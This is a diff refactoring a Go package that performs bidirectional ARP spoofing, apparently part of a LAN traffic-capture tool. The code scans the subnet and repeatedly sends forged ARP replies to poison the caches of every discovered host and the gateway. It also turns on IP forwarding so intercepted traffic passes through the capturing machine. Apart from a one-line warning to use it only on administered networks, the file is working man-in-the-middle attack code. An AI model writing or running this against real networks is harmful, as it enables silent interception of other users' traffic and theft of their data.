@@ -1,8 +1,11 @@
-package main
+// Package spoof implements bidirectional ARP spoofing so that LAN traffic
+// transits the capturing host. Use ONLY on networks you administer.
+package spoof
 
 import (
+	"context"
 	"fmt"
-	"log"
+	"log/slog"
 	"net"
 	"os/exec"
 	"sync"
@@ -11,23 +14,32 @@ import (
 	"github.com/gopacket/gopacket"
 	"github.com/gopacket/gopacket/layers"
 	"github.com/gopacket/gopacket/pcap"
+
+	"wtfi3/internal/netinfo"
 )
 
-// Spoofer performs bidirectional ARP spoofing between the gateway and every
-// discovered LAN host, so that their traffic transits this machine and can be
-// captured. It enables IP forwarding while running and restores ARP caches on
-// stop. Use ONLY on networks you administer.
-type Spoofer struct {
-	self    *SelfInfo
-	handle  *pcap.Handle
-	st      *State
-	mu      sync.Mutex
-	targets map[string]net.HardwareAddr // ip -> mac
-	stop    chan struct{}
-	wg      sync.WaitGroup
+// Store is the subset of the aggregator the spoofer reports into.
+type Store interface {
+	SetARP(ip net.IP, mac net.HardwareAddr)
+	LookupARP(ip net.IP) (net.HardwareAddr, bool)
+	MarkSpoofed(ip net.IP)
 }
 
-func startSpoof(self *SelfInfo, cidr string, st *State) (*Spoofer, error) {
+// Spoofer poisons ARP caches between the gateway and every discovered host.
+type Spoofer struct {
+	self    *netinfo.Self
+	handle  *pcap.Handle
+	store   Store
+	cancel  context.CancelFunc
+	mu      sync.Mutex
+	targets map[string]net.HardwareAddr
+	wg      sync.WaitGroup
+	stopOne sync.Once
+}
+
+// Start begins discovery and poisoning. Goroutines stop when ctx is canceled
+// or Stop is called; Stop also restores the ARP caches.
+func Start(ctx context.Context, self *netinfo.Self, scanCIDR string, store Store) (*Spoofer, error) {
 	if self.Gateway == nil {
 		return nil, fmt.Errorf("no default gateway found; cannot spoof")
 	}
@@ -35,61 +47,56 @@ func startSpoof(self *SelfInfo, cidr string, st *State) (*Spoofer, error) {
 	if err != nil {
 		return nil, err
 	}
-	// Only ARP frames are relevant to discovery/poisoning; filter the rest out.
 	if err := h.SetBPFFilter("arp"); err != nil {
 		h.Close()
 		return nil, fmt.Errorf("set bpf: %w", err)
 	}
-	sp := &Spoofer{self: self, handle: h, st: st, targets: map[string]net.HardwareAddr{}, stop: make(chan struct{})}
 
-	// Single long-lived ARP reader populates the shared ARP cache and target set.
+	cctx, cancel := context.WithCancel(ctx)
+	sp := &Spoofer{self: self, handle: h, store: store, cancel: cancel, targets: map[string]net.HardwareAddr{}}
+
 	sp.wg.Add(1)
-	go sp.listenReplies()
+	go sp.listenReplies(cctx)
 
-	// Resolve the gateway MAC (needed to poison it and to heal caches on stop).
-	gwMAC, err := sp.resolve(self.Gateway)
+	gwMAC, err := sp.resolve(cctx, self.Gateway)
 	if err != nil {
 		sp.Stop()
 		return nil, fmt.Errorf("resolve gateway %s: %w", self.Gateway, err)
 	}
 	self.GwMAC = gwMAC
-	log.Printf("gateway %s is at %s", self.Gateway, gwMAC)
+	slog.Info("gateway resolved", "ip", self.Gateway.String(), "mac", gwMAC.String())
 
-	enableForwarding(true)
+	setForwarding(true)
 
-	network := cidr
+	network := scanCIDR
 	if network == "" {
 		network = deriveCIDR(self.IP, self.Mask)
 	}
 	sp.wg.Add(2)
-	go sp.discoverLoop(network)
-	go sp.poisonLoop()
+	go sp.discoverLoop(cctx, network)
+	go sp.poisonLoop(cctx)
 	return sp, nil
 }
 
+// Stop cancels all goroutines, restores ARP caches, and disables forwarding.
 func (sp *Spoofer) Stop() {
-	select {
-	case <-sp.stop:
-		// already stopped
-	default:
-		close(sp.stop)
-	}
-	sp.wg.Wait()
-	sp.restore()
-	enableForwarding(false)
-	sp.handle.Close()
-	log.Println("spoof stopped, ARP caches restored")
+	sp.stopOne.Do(func() {
+		sp.cancel()
+		sp.wg.Wait()
+		sp.restore()
+		setForwarding(false)
+		sp.handle.Close()
+		slog.Info("spoof stopped, ARP caches restored")
+	})
 }
 
-// listenReplies is the sole reader of the ARP handle. It records every reply
-// into the shared ARP cache and tracks spoofable targets.
-func (sp *Spoofer) listenReplies() {
+func (sp *Spoofer) listenReplies(ctx context.Context) {
 	defer sp.wg.Done()
 	src := gopacket.NewPacketSource(sp.handle, sp.handle.LinkType())
 	pkts := src.Packets()
 	for {
 		select {
-		case <-sp.stop:
+		case <-ctx.Done():
 			return
 		case p, ok := <-pkts:
 			if !ok {
@@ -104,47 +111,38 @@ func (sp *Spoofer) listenReplies() {
 			if ip == nil || ip.Equal(sp.self.IP) {
 				continue
 			}
-			sp.st.setARP(ip, mac)
+			sp.store.SetARP(ip, mac)
 			if ip.Equal(sp.self.Gateway) {
 				continue
 			}
 			sp.mu.Lock()
 			if _, seen := sp.targets[ip.String()]; !seen {
 				sp.targets[ip.String()] = append(net.HardwareAddr(nil), mac...)
-				sp.st.mu.Lock()
-				sp.st.spoofed[ip.String()] = true
-				sp.st.mu.Unlock()
-				log.Printf("spoof target: %s (%s)", ip, mac)
+				sp.store.MarkSpoofed(ip)
+				slog.Info("spoof target", "ip", ip.String(), "mac", mac.String())
 			}
 			sp.mu.Unlock()
 		}
 	}
 }
 
-// resolve returns the MAC for ip by sending ARP requests and polling the cache
-// that listenReplies fills. It does not read the handle itself.
-func (sp *Spoofer) resolve(ip net.IP) (net.HardwareAddr, error) {
+func (sp *Spoofer) resolve(ctx context.Context, ip net.IP) (net.HardwareAddr, error) {
 	deadline := time.Now().Add(3 * time.Second)
-	key := ip.To4().String()
 	for time.Now().Before(deadline) {
 		sp.sendARP(layers.ARPRequest, sp.self.MAC, sp.self.IP, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ip)
 		select {
-		case <-sp.stop:
-			return nil, fmt.Errorf("stopped")
+		case <-ctx.Done():
+			return nil, ctx.Err()
 		case <-time.After(250 * time.Millisecond):
 		}
-		sp.st.mu.Lock()
-		mac := sp.st.arp[key]
-		sp.st.mu.Unlock()
-		if len(mac) == 6 {
+		if mac, ok := sp.store.LookupARP(ip); ok && len(mac) == 6 {
 			return mac, nil
 		}
 	}
 	return nil, fmt.Errorf("no reply")
 }
 
-// discoverLoop periodically ARP-scans the LAN to find new hosts.
-func (sp *Spoofer) discoverLoop(cidr string) {
+func (sp *Spoofer) discoverLoop(ctx context.Context, cidr string) {
 	defer sp.wg.Done()
 	scan := func() {
 		ips, err := hostsOf(cidr)
@@ -163,7 +161,7 @@ func (sp *Spoofer) discoverLoop(cidr string) {
 	defer t.Stop()
 	for {
 		select {
-		case <-sp.stop:
+		case <-ctx.Done():
 			return
 		case <-t.C:
 			scan()
@@ -171,29 +169,26 @@ func (sp *Spoofer) discoverLoop(cidr string) {
 	}
 }
 
-// poisonLoop repeatedly tells each target "gateway = me" and the gateway
-// "target = me", every 2s (ARP caches expire quickly).
-func (sp *Spoofer) poisonLoop() {
+func (sp *Spoofer) poisonLoop(ctx context.Context) {
 	defer sp.wg.Done()
 	t := time.NewTicker(2 * time.Second)
 	defer t.Stop()
 	for {
 		select {
-		case <-sp.stop:
+		case <-ctx.Done():
 			return
 		case <-t.C:
 			sp.mu.Lock()
 			for ipStr, mac := range sp.targets {
 				ip := net.ParseIP(ipStr).To4()
-				sp.sendARP(layers.ARPReply, sp.self.MAC, sp.self.Gateway, mac, ip)           // target: gw is me
-				sp.sendARP(layers.ARPReply, sp.self.MAC, ip, sp.self.GwMAC, sp.self.Gateway) // gw: target is me
+				sp.sendARP(layers.ARPReply, sp.self.MAC, sp.self.Gateway, mac, ip)
+				sp.sendARP(layers.ARPReply, sp.self.MAC, ip, sp.self.GwMAC, sp.self.Gateway)
 			}
 			sp.mu.Unlock()
 		}
 	}
 }
 
-// restore sends correct ARP mappings so the network heals after we stop.
 func (sp *Spoofer) restore() {
 	sp.mu.Lock()
 	defer sp.mu.Unlock()
@@ -233,13 +228,13 @@ func (sp *Spoofer) sendARP(op uint16, srcMAC net.HardwareAddr, srcIP net.IP, dst
 	_ = sp.handle.WritePacketData(buf.Bytes())
 }
 
-func enableForwarding(on bool) {
+func setForwarding(on bool) {
 	v := "0"
 	if on {
 		v = "1"
 	}
 	if err := exec.Command("sysctl", "-w", "net.inet.ip.forwarding="+v).Run(); err != nil {
-		log.Printf("warning: could not set ip.forwarding=%s: %v", v, err)
+		slog.Warn("could not set ip.forwarding", "value", v, "err", err)
 	}
 }
 
